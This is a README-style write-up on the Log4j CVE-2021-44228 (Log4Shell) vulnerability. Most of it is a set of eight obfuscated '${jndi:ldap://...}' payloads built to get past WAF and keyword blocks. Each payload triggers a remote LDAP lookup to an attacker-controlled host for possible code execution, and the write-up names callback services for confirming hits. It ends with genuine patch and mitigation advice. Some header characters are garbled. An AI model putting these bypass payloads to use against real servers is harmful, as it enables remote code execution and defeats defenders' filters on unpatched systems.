# üìù Description
üê±‚Äçüíª ‚úÇÔ∏è ü§¨ LOG4J Java exploit - A trick to bypass words blocking patches

**CVE-2021-44228** works on:

log4j: 2.0 <= Apache log4j <= 2.14.1

Java version already patched: 6u211+, 7u201+, 8u191+,  11.0.1+.

**Windows Defender started to remove .java files that include jndi:ldap:....**

Simple attacker script (Possible RCE):

`${jndi:ldap://somesitehackerofhell.com/z}`

WAF or developers started to block phrases:
- "ldap:"
- "jndi:"
  
to secure applications.


However, the attacker can bypass it by using one of these techniques:

## 1. System environment variables
   
`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}`

From Apache Log4j 2 documentation: `${env:ENV_NAME:-default_value}`

If there is no **ENV_NAME** system environment variable, use text after **:-** 

The attacker can use any name instead of **ENV_NAME**, but it has to no exists.


On windows, you can check your system environment variables in PowerShell by writing:

`dir env:`


---
## 2. Lower or Upper Lookup

`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}`

`${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}`

**Lower Lookup**
The LowerLookup converts the passed in argument to lower case. Presumably the value will be the
result of a nested lookup.


`${lower:<text>}`


**Upper Lookup**
The UpperLookup converts the passed in argument to upper case. Presumably the value will be the
result of a nested lookup.


`${upper:<text>}`

---
## 3. "::-" notation

`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}`

---

## 4. Invalid Unicode characters with upper


`${jnd${upper:ƒ±}:ldap://somesitehackerofhell.com/z}`

ƒ± get converted to i 

---

## 5. System properties

`${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}`

If there is no **SYS_NAME** system property, use text after **:-** 

---

## 6. ":-" notation

`${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}`

---

## 7. Date

`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}`

Java date formatting converts YYYY to 2021, but it converts 'YYYY' to YYYY or 'j' to j.

---

## 8. HTML URL Encoding
Replace characters with:
- **}** with **%7D**
- **{** with **%7B**
- **$** with **%24**

# Testing
To test entry you can use:

- https://canarytokens.org/generate - Choose token **Log4Shell** (entry notification will be send by email or webhook), generate and replace somesitehackerofhell.com/z
- https://dnslog.cn/ - Generate subdomain and replace somesitehackerofhell.com/z

# ‚ú® Best solution to protect from CVE-2021-44228
tl;dr Update to `log4j-2.16.0` or later.

**Log4j 1.x mitigation**: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.

**Log4j 2.x mitigation**: Implement one of the mitigation techniques below.

- Java 8 (or later) users should upgrade to release 2.16.0.
- Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
- Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class


Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.
